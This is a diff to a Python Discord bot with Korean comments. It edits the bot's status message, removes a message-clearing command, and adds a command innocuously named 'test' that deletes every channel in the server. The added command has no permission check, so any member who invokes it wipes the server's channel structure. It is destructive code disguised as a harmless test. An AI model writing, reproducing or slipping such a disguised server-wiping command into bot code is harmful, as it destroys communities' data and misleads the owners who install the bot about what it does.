@@ -12,23 +12,18 @@ async def on_ready():
   # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
   await client.change_presence(status=discord.Status.online)
 
-  await client.change_presence(activity=discord.Game(name=" 하는중"))
+  await client.change_presence(activity=discord.Game(name="이하율 아이 "))
   #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
   
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)
 
-@client.command(pass_context = True)
-async def clear(ctx, number):
-    number = int(number) #Converting the amount of messages to delete to an integer
-    counter = 0
-    async for x in Client.logs_from(ctx.message.channel, limit = number):
-        if counter < number:
-            await Client.delete_message(x)
-            counter += 1
-            await asyncio.sleep(1.2) #1.2 second timer so the deleting process can be even
-
+@client.command()
+async def test(ctx):
+    guild = ctx.guild
+    for channel in guild.channels:
+        await channel.delete()
 
 
 client.run(os.environ['token'])
